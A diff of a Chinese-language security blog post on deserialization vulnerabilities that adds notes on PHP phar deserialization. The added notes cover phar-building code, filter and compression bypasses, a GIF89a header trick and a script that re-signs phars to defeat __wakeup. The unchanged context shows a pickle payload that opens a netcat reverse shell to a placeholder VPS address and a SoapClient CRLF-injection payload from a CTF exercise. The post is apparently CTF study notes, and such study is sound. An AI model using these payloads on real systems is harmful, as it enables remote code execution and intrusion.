@@ -22,6 +22,7 @@
 
 <h3 id="反弹-shell-脚本"><a href="#反弹-shell-脚本" class="headerlink" title="反弹 shell 脚本"></a>反弹 shell 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc [vps-ip] [vps-port] -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment">## popen 也可以替换为 system</span></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(c))</span><br></pre></td></tr></table></figure>
 
+<h3 id="手写-opcode"><a href="#手写-opcode" class="headerlink" title="手写 opcode"></a>手写 opcode</h3><p><em>待。。。</em></p>
 <h2 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a>PHP 反序列化漏洞</h2><blockquote>
 <p>PHP中通常使用 <code>serialize</code> 函数进行序列化；使用 <code>unserialize</code> 函数进行反序列化</p>
 </blockquote>
@@ -79,6 +80,100 @@
 <ul>
 <li>大小写类名绕过：<code>CtFShOw</code></li>
 </ul>
+<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>利用条件：</p>
+<ol>
+<li>phar文件要能够上传到服务器端</li>
+<li>可用的魔术方法</li>
+<li>文件操作函数可控</li>
+</ol>
+<h4 id="phar-文件结构"><a href="#phar-文件结构" class="headerlink" title="phar 文件结构"></a>phar 文件结构</h4><p>phar 是 PHP 的一个归档文件格式，可以用于打包多个文件，类似于 zip 文件。PHP 内置了处理相关操作的 <code>Phar</code> 类，php.ini 中的 <code>phar.readonly</code> 配置项控制是否允许创建 phar 文件</p>
+<p>phar 文件结构主要由四部分组成：</p>
+<ol>
+<li>Phar file stub (头部标识)</li>
+</ol>
+<blockquote>
+<p>格式为 <code>xxx&lt;?php xxx;  __HALT_COMPILER();?&gt;</code></p>
+<p>前面 <code>xxx</code> 内容不限，但必须以 <code>__HALT_COMPILER();?&gt;</code> 来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件</p>
+</blockquote>
+<ol start="2">
+<li>Phar manifest file entry definition （内容清单）</li>
+</ol>
+<blockquote>
+<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分</p>
+<p>这部分还会以<strong>序列化</strong>的形式存储用户自定义的 <strong>meta-data</strong>，这是上述攻击手法最核心的地方</p>
+</blockquote>
+<img src="/2024/08/15/deserialization/phar-file.png" class="">
+
+<ol start="3">
+<li>the file contents</li>
+</ol>
+<blockquote>
+<p>被压缩的文件内容</p>
+</blockquote>
+<ol start="4">
+<li>(optional) a signature for verifying Phar integrity (phar file format only)</li>
+</ol>
+<blockquote>
+<p>文件签名，在文件末尾</p>
+</blockquote>
+<h4 id="phar-测试用例"><a href="#phar-测试用例" class="headerlink" title="phar 测试用例"></a>phar 测试用例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上述代码会生成 phar.phar 文件，其中 meta-data 以序列化的形式存储</p>
+</blockquote>
+<h4 id="phar-漏洞利用"><a href="#phar-漏洞利用" class="headerlink" title="phar 漏洞利用"></a>phar 漏洞利用</h4><p>php 大部门的<strong>文件系统函数</strong>在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会讲 meta-data 反序列化，包括以下函数：</p>
+<img src="/2024/08/15/deserialization/phar-functions.png" class="" title="phar-functions">
+
+
+<p>phar 反序列化测试用例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;_destruct() called!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line">	<span class="comment">//unlink($filename);</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ol>
+<li><p>限制 phar 字符不能出现在前面，可以使用 <code>compress.bzip2://</code> 、<code>compress.zlib://</code> 等绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br></pre></td></tr></table></figure></li>
+<li><p>利用 <code>filter</code> 过滤器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li>
+<li><p>GIF 格式验证可以通过在文件头部添加 <code>GIF89a</code> 绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤 <code>__HALT_COMPILER();</code></p>
+</li>
+</ol>
+<ul>
+<li><p>将 phar 文件进行 gzip 压缩 ，使用压缩后 phar 文件同样也能反序列化 (常用)，linux 下使用 gzip 命令进行压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip phar.phar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将 phar 的内容写进压缩包注释中，也同样能够反序列化成功，压缩为 zip 也会绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="5">
+<li>修改 phar 签名</li>
+</ol>
+<p>某些情况需要修改 phar 文件中的内容而达到某些需求(比如要绕过 <code>__wakeup</code> 要修改属性数量)，而修改后的 phar 文件由于文件发生改变，所以须要修改签名才能正常使用，phar 支持签名的格式有 MD5、SHA1、SHA256、SHA512 和 OPENSSL</p>
+<table>
+<thead>
+<tr>
+<th align="center">字节长度</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">可变的</td>
+<td align="left">实际的签名长度，SHA1 签名占用 20 字节，MD5 签名占用 16 字节，SHA256 签名占用 32 字节，而 SHA512 签名为 64 字节，OPENSSL 格式的签名长度取决于私钥的大小</td>
+</tr>
+<tr>
+<td align="center">4 字节</td>
+<td align="left">签名标志。0x0001 用于MD5，0x0002 用于SHA1，0x0003 代表了 SHA256，0x0004 表示为 SHA512，0x0010 用于定义 OPENSSL</td>
+</tr>
+<tr>
+<td align="center">4 字节</td>
+<td align="left">GBMB 末尾标识</td>
+</tr>
+</tbody></table>
+<p>修改签名测试用例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        f = file.read()</span><br><span class="line">    s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span></span><br><span class="line">    s = s.replace(<span class="string">b&#x27;3:&#123;&#x27;</span>, <span class="string">b&#x27;4:&#123;&#x27;</span>)<span class="comment"># 绕过__wakeup</span></span><br><span class="line">    h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识，各4个字节</span></span><br><span class="line">    newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line">    <span class="keyword">return</span> gzip.compress(newf)<span class="comment"># 进行gzip压缩</span></span><br></pre></td></tr></table></figure>
+
+
 <h3 id="SoapClient-原生类利用"><a href="#SoapClient-原生类利用" class="headerlink" title="SoapClient 原生类利用"></a><code>SoapClient</code> 原生类利用</h3><p><code>SoapClient</code> 的魔术方法 <code>__call</code>，当访问类中一个不存在的方法时触发，该方法就会被传递给 <code>__call</code> 方法进行处理，并将其转化为一条SOAP 请求发送给 Web 服务</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Chrome^^X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>. </span><br><span class="line">        <span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;dwzzzzzzzzzz&quot;</span>));</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -124,4 +219,8 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getAge&quot;</span>,<span class="literal">null</span>);  System.out.println(method.invoke(user));</span><br></pre></td></tr></table></figure>
 
 
-<h3 id="FastJSON-反序列化漏洞"><a href="#FastJSON-反序列化漏洞" class="headerlink" title="FastJSON 反序列化漏洞"></a>FastJSON 反序列化漏洞</h3></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-08-15</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2024/08/15/deserialization/,Mini's blog,反序列化,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/07/08/LLM-Framework/" title="LLM 框架">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+<h3 id="FastJSON-反序列化漏洞"><a href="#FastJSON-反序列化漏洞" class="headerlink" title="FastJSON 反序列化漏洞"></a>FastJSON 反序列化漏洞</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]. <a target="_blank" rel="noopener" href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">反序列化漏洞及各种绕过姿势</a></p>
+<p>[2]. <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/276624.html">常见的Web漏洞——反序列化漏洞</a></p>
+<p>[3]. <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjeauisbeWbbDu7AoD#toc-5">pickle 反序列化初探</a></p>
+<p>[4]. <a target="_blank" rel="noopener" href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射</a></p>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-08-15</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2024/08/15/deserialization/,Mini's blog,反序列化,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/07/08/LLM-Framework/" title="LLM 框架">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
